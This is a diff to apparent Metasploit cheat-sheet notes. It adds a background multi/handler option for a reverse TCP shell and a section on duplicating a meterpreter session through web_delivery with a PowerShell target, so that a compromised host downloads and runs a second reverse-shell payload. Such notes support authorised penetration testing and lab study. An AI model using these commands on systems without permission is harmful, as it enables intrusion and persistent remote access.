@@ -107,6 +107,7 @@ show payloads                           ;; show payloads
 set payload linux/x64/shell/reverse_tcp ;; set the appropriate payload
 set LHOST <network-interface>           ;; e.g., tun0 or wlan0
 set LPORT 4242
+set ExitOnSession false                 ;; keeps the multi/handler in background
 exploit -j                              ;; wait for shell
 jobs                                    ;; shows background jobs
 ;; once inside whatever shell, we can do
@@ -137,3 +138,18 @@ run autoroute -s 172.18.1.0 -n 255.255.255.0
 makerc <nameoftheoutputfile>
 ;; then we can load it by doing:
 msfconsole -r <nameoftheoutputfile>
+
+
+# Duplicate a Shell (Yes! Do it!)
+;; once we have a meterpreter shell on session x (e.g., 2)
+;; we can duplicate it on a different port by doing:
+use exploit/multi/script/web_delivery
+use windows/meterpreter/reverse_tcp    # select accordingly to what we need (or simply the one in the other session)
+;; choose a different port here with respect to the other sessions
+show targets                           
+set target PSH                         # select accordingly to target OS/config (in this case powershell)
+exploit
+sessions -i 2
+shell
+<copy and paste>/<wait ...>
+Ctrl+z Ctrl+z to go back to meterpreter and then to msfconsole
